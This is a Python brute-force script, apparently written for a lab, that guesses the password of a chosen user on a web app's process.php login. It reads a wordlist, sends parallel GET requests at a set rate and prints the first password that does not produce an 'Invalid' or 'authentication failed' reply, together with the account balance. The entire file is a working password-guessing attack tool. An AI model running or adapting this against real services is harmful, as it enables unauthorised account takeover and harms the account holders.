# importing the requests library
import time
import threading
import argparse
import os
import signal
from concurrent.futures import as_completed
from pprint import pprint
from requests_futures.sessions import FuturesSession
from urllib.parse import parse_qs, urlparse

# PARAMS NEEDED FOR THE EXECUTION
parser = argparse.ArgumentParser(
    description='Automatic checker for common password, will try to see the balance of a given user')
parser.add_argument('-u', dest='user',
                    type=str, required=True, help='User to brute force')
parser.add_argument('-r', dest='n_req',
                    type=int, default=2, help='Number of requests to perform everys second, by default 2')
parser.add_argument('-d', dest='destination',
                    type=str, default="10.1.5.2", help='IP or URL used to reach the server, by default is 10.1.5.2')
parser.add_argument('-p', dest='port',
                    type=int, default=80, help='PORT used to reach the server, by default is 80')
parser.add_argument('-f', dest='psw_file',
                    type=str, default="common_psw.txt", help='Filename where the password are stored, '
                    'by default is common_psw.txt')
args = parser.parse_args()

URL = f"http://{args.destination}:{args.port}/process.php"
USER = args.user
N_REQ = args.n_req
req = []

f = open(args.psw_file, 'r')

PARAMS = {
  'user': USER,
  'pass': '',
  'drop': 'balance',
  'amount': '',
  }


# The only purpose of this methode is to nicely stop the application and its threads after the first CTRL + C
def signal_handler(sig, frame):
    print('\n\nExiting the application. Goodbye')
    os._exit(1)


# This funciton is run in a parallel thread, check the list of request trying to see new answer, 
# in an affermative case the answer is checked. If is a failed
# login the answer is discard, if is a successful login the used password is print onscreen and the application end.
def check_response():
    global req
    while True:
        for future in as_completed(req):
            resp = future.result()
            if "Invalid" not in resp.text and "authentication failed" not in resp.text:
                print(f"\nGet a positive response using password {parse_qs(urlparse(resp.url).query)['pass']}:\n")
                print(resp.text)
                print("closing the application")
                os._exit(1)
            req.remove(future)


# The script will start sendin N req/s to the URL setting a new password for each request. A request is
#  then added to a list waiting for the answer
def main():
    global req
    print(f'Starting brute forcing {USER} by sending {N_REQ} requests every second.')
    session = FuturesSession()
    for line in f:
        PARAMS['pass'] = line.replace("\n", "")
        req.append(session.get(url=URL, params=PARAMS))
        time.sleep(1/N_REQ)
    print("No match, exiting, waiting a few seconds for the last answer and exiting")
    time.sleep(30)
    os._exit(1)


if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    check_r = threading.Thread(target=check_response, name='check_response')
    check_r.start()
    main()
